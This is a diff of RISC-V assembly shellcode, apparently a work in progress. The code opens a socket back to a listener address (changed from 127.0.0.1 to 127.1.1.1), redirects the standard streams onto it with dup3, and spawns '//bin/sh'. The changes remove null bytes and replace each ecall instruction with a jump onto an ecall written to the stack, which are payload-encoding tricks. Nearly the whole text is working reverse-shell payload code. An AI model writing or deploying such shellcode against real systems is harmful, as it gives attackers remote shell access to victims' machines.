@@ -91,9 +91,13 @@ _start:
 	xor a6,a7,a7
 	addi a6,a6,0x0073
 	sd a6,0(sp)
-	xor a3,a7,a7
-	li a3,0x8067 #<
-	sd a3,4(sp)
+	addi a3,a3,2023
+	xor a4,a7,a7
+	addi a4,a4,16
+	mul a3,a3,a4
+	xor a6,a7,a7
+	addi a6,a3,0x1f7
+	sd a6,4(sp)
 	xor a3,a7,a7
 	addi a3,sp,-0x11
 	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
@@ -111,7 +115,7 @@ _start:
 	addi t0,t0,-0xe0
 	mul a7,a7,t0 #addi a7,a7,0x3905 
 	sd a7,2(sp)
-	li a7,0x100007f #127.0.0.1 - LHOST, this will need some logic too fix the fact that null's can exist
+	li a7,0x101017f #127.1.1.1 - LHOST, this will need some logic too fix the fact that null's can exist
 	sd a7,4(sp)
 	xor a1,a7,a7
 	xori a1,sp,0x010
@@ -128,7 +132,8 @@ _start:
 	#ecall will clobber a0/socket fd
 	xor t0,a7,a7
 	addi t0,a0,1337 #added a value to hide my nulls, this will need subbed later
-	ecall
+	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
+	#ecall
 	##WORK
 	#dup2(a0,{1,2,3})
 	xor a0,a7,a7
@@ -138,15 +143,18 @@ _start:
 	xor a7,a7,a7
 	addi a7,a7,0xee
 	addi a7,a7,-0xd6 #__NR_dup3 24
-	ecall
+	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
+	#ecall
 	xor a0,a7,a7
 	addi a0,t0,-1337
 	addi a1,a7,-23 # 24 -> 1
-	ecall
+	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
+	#ecall
 	xor a0,a7,a7
 	addi a0,t0,-1337
 	addi a1,a7,-22 # 24 -> 2
-	ecall
+	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
+	#ecall
 	
 	#execve("//bin/sh",NULL,NULL);
         li a7,0x69622f2f #ib//
@@ -162,4 +170,5 @@ _start:
         xor a1,a7,a7
         xor a7,a7,a7
         addi a7,a7,221
-        ecall
+	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
+        #ecall
